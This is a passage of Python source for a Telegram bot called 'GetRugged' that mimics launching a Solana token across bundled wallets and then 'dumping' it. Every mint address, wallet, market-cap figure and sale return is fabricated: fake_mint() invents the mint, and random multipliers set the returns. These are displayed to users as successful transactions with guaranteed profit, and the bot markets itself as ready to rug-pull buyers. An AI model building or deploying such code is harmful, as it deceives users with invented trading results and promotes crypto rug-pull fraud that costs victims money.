    name = data["name"]
    per_wallet = round(invest / bundle, 4)

    stages = [
        (f"<b>${symbol}</b> // Deploying\nDeriving {bundle} keypairs...", 0.7),
        (f"<b>${symbol}</b> // Deploying\nFunding {bundle} wallets ({per_wallet} SOL each)...", 0.9),
        (f"<b>${symbol}</b> // Deploying\nCreating mint on bonding curve...", 0.8),
        (f"<b>${symbol}</b> // Deploying\nExecuting bundle transactions...", 0.9),
        (f"<b>${symbol}</b> // Live\nSuccessfully deployed and bundled.", 0.5),
    ]
    await staged_loading(cb, stages)

    active.balance_sol = round(max(0.0, active.balance_sol - invest), 4)
    mint = fake_mint()
    bundle_wallets = [_fake_sol_pubkey() for _ in range(bundle)]
    token = {
        "name": name,
        "symbol": symbol,
        "bundle": bundle,
        "invest": invest,
        "per_wallet": per_wallet,
        "mint": mint,
        "status": "live",
        "ts": time.time(),
        "dumped": False,
        "bundle_wallets": bundle_wallets,
    }
    sess.launched_tokens.append(token)
    sess.launches_left = max(0, sess.launches_left - 1)
    sess.total_launches += 1

    add_personal_tx(sess, f"Create Mint ${symbol}", "success")
    add_personal_tx(sess, f"Bundle Buy x{bundle}", "success", amount=-invest)

    token["mcap"] = round(random.uniform(12_000, 95_000), 0)
    token["holders"] = random.randint(40, 180)
    token["buys"] = random.randint(18, 90)

    text = (
        f"<b>${symbol}</b>  -  Live\n"
        f"<code>{mint}</code>\n\n"
        f"MCap: <b>~${token['mcap']:,.0f}</b>  |  Holders: <b>{token['holders']}</b>  |  Buys: <b>{token['buys']}</b>\n"
        f"Dev Buy: <b>{invest:.4f} SOL</b> (x{bundle} wallets)\n\n"
        "Sniper Guard: Active  -  Ready to dump"
    )
    try:
        await safe_edit_message(cb, text, reply_markup=live_token_kb(mint, bundle), parse_mode=ParseMode.HTML)
    except Exception:
        await cb.message.answer(text, reply_markup=live_token_kb(mint, bundle), parse_mode=ParseMode.HTML)
    await state.clear()

@router.callback_query(F.data.startswith("viewwallets:"))
async def view_wallets(cb: CallbackQuery):
    mint = cb.data.split(":", 1)[1]
    sess = get_session(cb.from_user.id)
    token = next((t for t in reversed(sess.launched_tokens) if t.get("mint") == mint), None)
    if not token:
        await cb.answer("Token not found", show_alert=True)
        return
    dumped = set(token.get("dumped_idxs") or [])
    lines = [f"<b>Bundle Wallets</b>\nToken: {token['name']} (${token['symbol']})\n"]
    for i, addr in enumerate(token.get("bundle_wallets") or [], 1):
        status = "SOLD" if i in dumped or token.get("dumped") else "ACTIVE"
        lines.append(f"{i:02d}. [{status}] <code>{addr}</code>")
    await cb.message.answer("\n".join(lines), parse_mode=ParseMode.HTML)
    await cb.answer()

@router.callback_query(F.data.startswith("dumpone:"))
async def dump_one(cb: CallbackQuery):
    parts = cb.data.split(":")
    if len(parts) < 3:
        await cb.answer("Bad payload", show_alert=True)
        return
    mint, idx_s = parts[1], parts[2]
    try:
        idx = int(idx_s)
    except ValueError:
        await cb.answer("Bad index", show_alert=True)
        return
    sess = get_session(cb.from_user.id)
    token = next((t for t in reversed(sess.launched_tokens) if t.get("mint") == mint), None)
    if not token:
        await cb.answer("Token not found", show_alert=True)
        return
    if token.get("dumped"):
        await cb.answer("Already fully sold", show_alert=True)
        return
    dumped = set(token.get("dumped_idxs") or [])
    if idx in dumped:
        await cb.answer(f"Wallet {idx} already sold", show_alert=True)
        return

    await cb.answer()
    per = float(token.get("per_wallet") or 0.3)
    returned = round(per * random.uniform(1.55, 3.2), 4)
    dumped.add(idx)
    token["dumped_idxs"] = sorted(dumped)
    add_personal_tx(sess, f"Sell W{idx} ${token.get('symbol','')}", "success", amount=returned)

    bundle = int(token.get("bundle") or 10)
    if len(dumped) >= bundle:
        token["dumped"] = True
        token["status"] = "dumped"
        token["profit"] = round(returned * bundle - float(token.get("invest") or 0), 4)
    await cb.message.answer(f"Wallet {idx} sold successfully. Returned <b>+{returned:.4f} SOL</b>", parse_mode=ParseMode.HTML)

@router.callback_query(F.data.startswith("dump:"))
async def dump_all(cb: CallbackQuery):
    uid = cb.from_user.id
    sess = get_session(uid)
    mint = cb.data.split(":", 1)[1]
    token = next((t for t in reversed(sess.launched_tokens) if t.get("mint") == mint), None)
    if not token:
        await cb.answer("Token not found", show_alert=True)
        return
    if token.get("dumped"):
        await cb.answer("Already dumped", show_alert=True)
        return

    await cb.answer()
    invest = float(token.get("invest") or 3)
    bundle = int(token.get("bundle") or 10)
    symbol = token.get("symbol", "???")
    returned_total = round(invest * random.uniform(1.8, 3.5), 4)
    profit = round(returned_total - invest, 4)

    token["dumped"] = True
    token["status"] = "dumped"
    token["profit"] = profit
    token["returned"] = returned_total

    add_personal_tx(sess, f"Sell All ${symbol}", "success", amount=returned_total)
    add_personal_tx(sess, "Profit settled", "success", amount=profit)

    if sess.wallets:
        w = sess.wallets[sess.active_wallet_idx]
        w.balance_sol = round(w.balance_sol + returned_total, 4)

    text = (
        f"<b>${symbol}  -  SOLD OUT</b>\n"
        "────────────────────────────\n"
        f"Invested:  <b>{invest:.4f} SOL</b>\n"
        f"Returned:  <b>{returned_total:.4f} SOL</b>\n"
        f"Profit:    <b>+{profit:.4f} SOL</b>\n\n"
        f"All {bundle} wallets closed."
    )
    await safe_edit_message(cb, text, reply_markup=post_dump_kb(mint), parse_mode=ParseMode.HTML)

@router.callback_query(F.data.startswith("dumpreset:"))
async def dump_reset(cb: CallbackQuery):
    mint = cb.data.split(":", 1)[1]
    sess = get_session(cb.from_user.id)
    token = next((t for t in reversed(sess.launched_tokens) if t.get("mint") == mint), None)
    if not token:
        await cb.answer("Token not found", show_alert=True)
        return
    token["dumped_idxs"] = []
    await cb.answer("Dump markers reset")
    try:
        await cb.message.edit_reply_markup(reply_markup=live_token_kb(mint, int(token.get("bundle") or 10)))
    except Exception:
        pass

@router.message(Command("help"))
async def cmd_help(message: Message):
    uid = message.from_user.id
    if uid not in ADMIN_IDS:
        await message.answer(
            "<b>GetRugged Help</b>\n"
            "Use the menu buttons to launch tokens, manage wallets, view portfolio, and configure settings.",
            parse_mode=ParseMode.HTML,
        )
        return
    await message.answer("<b>Admin panel commands active.</b>", parse_mode=ParseMode.HTML)

@router.message(Command("admin"))
async def admin_panel(message: Message):
    if message.from_user.id not in ADMIN_IDS: return
    await message.answer("<b>Admin status: Online</b>", parse_mode=ParseMode.HTML)

async def main():
    if BOT_TOKEN == "PUT_YOUR_BOT_TOKEN_HERE":
        log.error("Set BOT_TOKEN env var")
        return
    _load_state()
    bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
    _bot_ref = bot
    dp = Dispatcher(storage=MemoryStorage())
    dp.include_router(router)
    log.info("Bot starting...")
    try:
        await dp.start_polling(bot)
    finally:
        pass

if __name__ == "__main__":
    asyncio.run(main())
